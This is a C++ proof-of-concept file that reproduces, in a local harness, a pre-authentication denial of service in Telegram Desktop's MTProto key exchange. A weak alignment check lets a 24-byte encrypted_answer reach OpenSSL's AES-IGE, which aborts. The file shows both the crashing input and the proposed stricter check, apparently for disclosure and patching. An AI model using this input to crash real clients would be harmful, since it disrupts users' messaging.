// PoC — MTPROTO-3: pre-auth remote DoS in DcKeyCreator::dhParamsAnswered.
//
// Faithfully models the length gate at
//   Telegram/SourceFiles/mtproto/details/mtproto_dc_key_creator.cpp:604-634
// then performs the exact same AES-IGE decrypt the client performs on the
// server-controlled `encrypted_answer` string. OpenSSL's AES_ige_encrypt
// asserts (length % 16 == 0) and aborts on any 4-aligned-but-not-16-aligned
// length, which the client's `encDHLen & 0x03` gate fails to reject.
//
//   ./poc buggy    -> reproduces the abort (SIGABRT) with encrypted_answer len 24
//   ./poc fixed    -> proposed `encDHLen & 0x0F` gate rejects it, no abort
//
// Build: c++ -std=c++17 -g poc_dh_ige_abort.cpp -o poc -lcrypto
#include <openssl/aes.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

using uint32 = uint32_t;

// Mirrors aesIgeDecryptRaw() in mtproto_auth_key.cpp:161-169 (verbatim shape).
static void aesIgeDecryptRaw(const void *src, void *dst, uint32 len,
                             const void *key, const void *iv) {
    unsigned char aes_key[32], aes_iv[32];
    memcpy(aes_key, key, 32);
    memcpy(aes_iv, iv, 32);
    AES_KEY aes;
    AES_set_decrypt_key(aes_key, 256, &aes);
    AES_ige_encrypt((const unsigned char *)src, (unsigned char *)dst, len,
                    &aes, aes_iv, AES_DECRYPT);
}

// Models the server_DH_params_ok handler's decrypt prologue.
// `applyFix` toggles the proposed `& 0x0F` (16-byte) alignment gate.
static bool dhParamsAnswered_decrypt(const std::string &encrypted_answer,
                                     bool applyFix) {
    const std::string &encDHStr = encrypted_answer; // data.vencrypted_answer().v
    uint32 encDHLen = (uint32)encDHStr.length();
    uint32 encDHBufLen = encDHLen >> 2;

    // dc_key_creator.cpp:605 — the ONLY length checks before the IGE decrypt.
    const uint32 alignMask = applyFix ? 0x0Fu : 0x03u; // fix widens 4->16
    if ((encDHLen & alignMask) || encDHBufLen < 6) {
        printf("  gate rejected encrypted_answer (len=%u) -> handshake fails, no crash\n",
               encDHLen);
        return false;
    }
    printf("  gate ACCEPTED encrypted_answer (len=%u, len%%16=%u); calling AES-IGE...\n",
           encDHLen, encDHLen % 16);
    fflush(stdout);

    // dc_key_creator.cpp:623-634 — decBuffer sized to encDHBufLen primes,
    // then decrypt encDHLen bytes into it. Sizes match (no OOB); the abort is
    // purely OpenSSL's block-size assertion.
    std::vector<uint32> decBuffer(encDHBufLen, 0);
    unsigned char aesKey[32], aesIV[32];
    memset(aesKey, 0x11, 32);
    memset(aesIV, 0x22, 32);
    aesIgeDecryptRaw(encDHStr.data(), decBuffer.data(), encDHLen, aesKey, aesIV);

    printf("  (returned without abort)\n");
    return true;
}

int main(int argc, char **argv) {
    const bool applyFix = (argc > 1 && std::string(argv[1]) == "fixed");
    printf("== MTPROTO-3 PoC (%s) ==\n", applyFix ? "fixed gate" : "buggy gate");

    // Attacker-chosen encrypted_answer of 24 bytes: 24 %4 == 0 (passes the
    // real client's gate) and 24/4 == 6 primes (passes encDHBufLen >= 6),
    // but 24 %16 == 8 (fails AES-IGE's block-size requirement).
    std::string evil(24, '\xAB');
    dhParamsAnswered_decrypt(evil, applyFix);
    printf("== done (survived) ==\n");
    return 0;
}
